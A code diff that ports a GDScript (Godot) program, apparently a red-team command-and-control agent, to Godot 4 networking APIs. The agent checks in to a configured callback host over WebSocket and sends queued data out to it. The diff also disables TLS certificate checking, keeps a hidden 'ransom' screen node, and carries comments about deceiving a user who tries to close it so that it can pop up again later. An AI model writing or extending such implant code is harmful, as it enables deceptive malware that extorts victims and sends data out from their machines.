@@ -6,6 +6,7 @@ var do_exit = false
 var exiting = false
 var outbound = []
 var _client
+var _client_options
 var headers
 var connect_attempt
 
@@ -18,10 +19,10 @@ signal post_response
 func _unhandled_input(event):
 	if event is InputEventKey:
 		if event.pressed:
-			print(event.scancode)
+			print(event.keycode)
 
 func _notification(what):
-	if what == MainLoop.NOTIFICATION_WM_QUIT_REQUEST:
+	if what == Window.NOTIFICATION_WM_CLOSE_REQUEST:
 		pass
 		# Send notification to redteam that the user is trying to close the agent?
 		# Send window to background so they think they were successful, set timer, pop-up again in a little bit?
@@ -35,24 +36,12 @@ func _ready():
 
 	$ransom.hide()
 	
-	_client = WebSocketClient.new()
-
-	_client.connect("connection_closed", self, "_closed")
-	_client.connect("connection_error", self, "_error")
-	_client.connect("connection_established", self, "_connected")
-	_client.connect("data_received", self, "_on_data")
-	_client.connect("server_close_request", self, "_on_server_close")
+	_client = WebSocketPeer.new()
+	_client_options = TLSOptions.client_unsafe()
 
 	$CallbackTimer.wait_time = $config.get_callback_wait_time()
 	
 	print("$CallbackTimer.wait_time: ", $CallbackTimer.wait_time)
-
-	_client.set_buffers(1024, 1024, 1024, 1024)
-	_client.set_verify_ssl_enabled($config.get_verify())
-
-func _on_server_close (code, reason):
-	print("_on_server_close ", code, " " , reason)
-	exiting = true
 
 func _error():
 	print("websocket error...")
@@ -68,7 +57,7 @@ func _connected(_proto = ""):
 
 	$CallbackTimer.start()
 
-	var ret = _client.get_peer(1).put_packet($api.wrap_payload($api.get_checkin_payload()))
+	var ret = _client.put_packet($api.wrap_payload($api.get_checkin_payload()))
 
 	if ret != OK:
 		print("failed to send checkin")
@@ -76,8 +65,8 @@ func _connected(_proto = ""):
 		print("checkin sent") # After N tasking requests w/o responses - kill ourself 
 
 func _on_data():
-	var packet = _client.get_peer(1).get_packet().get_string_from_utf8()
-	
+	var packet = _client.get_packet().get_string_from_utf8()
+
 	if not packet.length():
 		return
 
@@ -103,26 +92,29 @@ func _process(delta):
 	time += delta
 
 	if time > time_period:
-		var status = _client.get_connection_status()
+		_client.poll()
 
-		if status == NetworkedMultiplayerPeer.CONNECTION_DISCONNECTED:
+		var status = _client.get_ready_state()
 
+		if status == WebSocketPeer.STATE_CLOSED:
+			print("client closed %d --- %s\n" % [_client.get_close_code(), _client.get_close_reason()])
+			
 			if connect_attempt <= 0:
 				close_and_quit()
 			else:
 				# TODO: timer for attempts or bursty, go, go, go! ?
-				var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())
+				var err = _client.connect_to_url($config.get_callback_uri(), _client_options)
 
 				if err != OK:
 					print("Unable to connect")
 					connect_attempt -= 1
 				else:
 					print("connected?")
-		else:
-			_client.poll()
 
-			if $api.checkin_done and not exiting:
-				print("outbound size: %s in %s seconds" % [String(outbound.size()), String($CallbackTimer.wait_time)])
+		elif status == WebSocketPeer.STATE_OPEN:
+
+			if $api.get("checkin_done") and not exiting:
+				print("outbound size: %d in %d seconds" % [outbound.size(), $CallbackTimer.wait_time])
 
 				time = 0
 
@@ -132,9 +124,9 @@ func _process(delta):
 					# TODO: flush outbound, slow emit, or only one at a time?
 					while outbound.size() > 0:
 						var msg = outbound.pop_front()
-						print("outbound size: %s in" % String(outbound.size()))
+						print("outbound size: %d in" % outbound.size())
 
-						var ret = _client.get_peer(1).put_packet(msg)
+						var ret = _client.put_packet(msg)
 
 						if ret != OK:
 							print("failed to send data...", msg)
@@ -151,7 +143,7 @@ func _process(delta):
 func close_and_quit():
 	set_process(false)
 
-	yield(get_tree().create_timer(1.0), "timeout")
+	await get_tree().create_timer(1.0).timeout
 
 	get_tree().quit()
 
